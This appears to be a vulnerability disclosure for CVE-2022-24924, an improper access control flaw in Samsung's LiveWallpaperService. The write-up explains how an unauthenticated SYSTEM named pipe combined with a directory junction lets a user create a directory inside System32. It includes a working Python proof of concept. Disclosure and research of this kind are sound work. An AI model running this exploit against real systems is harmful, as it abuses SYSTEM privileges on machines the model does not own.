# Improper access control vulnerability in LiveWallpaperService CVE-2022-24924(SVE-2021-24089)

Windows version tested: Windows 10 20H2 (Build 19042.1348) 64bit

Live Wallpaper Version: 3.0.9.0 or earlier

There is a LiveWallpaperService that works by default in Samsung laptops, but there was a vulnerability that created the SYSTEM directory in a directory with SYSTEM privileges in the SYSTEM service.

Live Wallpaper is usually installed by default on Samsung laptops, but it is also an app available from the Microsoft Store. The app can be run with User permission and communicates between the server and the client through Named PIPE IPC. At this time, the PIPE Server is operating with SYSTEM privileges and does not check which the clients are.

The following is the operation process performed when the corresponding app is launched.

Server is '33;' Upon receiving the unicode string, it accesses the 'C:\Users\{username}\AppData\Local\Packages\Sidia.LiveWallpaper_wkpx6gdq8qyz8' folder and checks the existence of the LiveWallpaperData directory. A new file system directory is created in the directory with the name 'LiveWallpaperData'.

Named PIPE is used to communicate with each other between processes. Since there is no separate client inspection, the attacker can directly open it and send the desired data.

First, after opening Named PIPE directly, create a directory junction to C:\Windows\System32 using symboliclink-testing-tools produced by james forshaw. It is created as a subdirectory of the System32 directory with privileges.

Here is the PoC for that vulnerability.

In order to perform PoC, the following conditions must be met:

1. Basically, LiveWallpaperService must be running in Windows.
2. The CreateMountPoint.exe executable file and DeleteMountPoint.exe executable file built using the symboliclink-testing-tools produced by james forshaw must exist in the same directory as the PoC.

```python
# python 3.7.2
import os
import shutil
import time
import getpass

def stringToWstring(st : str) -> str:
    result = ''
    for i in st:
        result += i+'\x00'
    return result

def main():
    # current user name
    username = getpass.getuser()

    # path settings
    path1 = f'C:\\Users\\{username}\\AppData\\Local\\Packages\\Sidia.LiveWallpaper_wkpx6gdq8qyz8'
    path2 = 'C:\\Windows\\System32'

    # delete directory
    if os.path.isdir(path1):
        shutil.rmtree(path1)

    # create directory junction
    command = f'CreateMountPoint.exe "{path1}" "{path2}"'
    os.system(command)

    # write data to named pipe
    with open('\\\\.\\pipe\\LiveWallpaperPipe', 'a') as f:
        f.write(stringToWstring('33;'))

    # IPC delay time
    time.sleep(2)

    # directory check
    if os.path.isdir(path2+'\\LiveWallpaperData'):
        print('[+] Success')
    else:
        print('[-] failed')

    # delete directory junction
    command = f'DeleteMountPoint.exe {path1}'
    os.system(command)
    shutil.rmtree(path1)

if __name__=='__main__':
    main()
```



https://user-images.githubusercontent.com/57859128/166858916-1f0b9f9a-6935-452d-8b38-18828beace0f.mp4

